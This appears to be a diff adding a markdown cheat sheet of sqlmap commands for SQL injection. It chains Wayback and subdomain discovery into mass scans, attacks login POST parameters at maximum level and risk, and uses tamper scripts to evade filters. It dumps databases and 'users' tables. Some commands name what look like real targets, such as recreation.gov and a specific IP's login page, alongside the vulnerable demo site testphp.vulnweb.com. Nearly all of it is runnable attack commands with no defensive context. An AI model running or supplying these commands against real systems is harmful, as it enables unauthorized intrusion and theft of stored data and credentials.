@@ -1,0 +1,71 @@
+## Sql Injection :-
+
+
+sqlmap -m s.txt --level 1 --random-agent --batch --dbs
+
+sqlmap -m s.txt --level 1 --random-agent --batch --tamper="space2comment" --dbs
+
+
+
+- echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt
+
+- cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt
+
+- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+
+
+- sqlmap -u https://3.65.104.18/index.php --dbs --forms --crawl=2
+
+
+- sqlmap -u "http://www.example.com/submit.php" --data="search=hello&value=submit"
+
+
+## Test POST Requests for SQL Injection Vulnerabilities :-
+
+sqlmap -u "https://3.65.104.18/index.php/index/loginpopupsave
+" --data "username=2&password=3" -p "username,password" --method POST
+
+
+sqlmap -r request.txt -p login --dbms="MySQL" --force-ssl --level 5 --risk 3 --dbs --hostname
+
+
+## SQLi One Linear :-
+
+- cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
+
+- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
+
+## Dump-Data :-
+
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)
+
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )
+
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )
+
+- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
+
+
+
+
+
+--batch --random-agent --tamper="space2comment" --level=5 --risk=3 --threads=10 --dbs
+
+
+
+--level=5 --risk=3 --random-agent -v3 --tamper="between,randomcase,space2comment" --dbs
+
+--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+
+-v3 --technique U --tamper="space2mysqlblank.py" --dbs
+
+-v3 --technique U --tamper="space2comment" --dbs
+
+
+
+
+
+
+
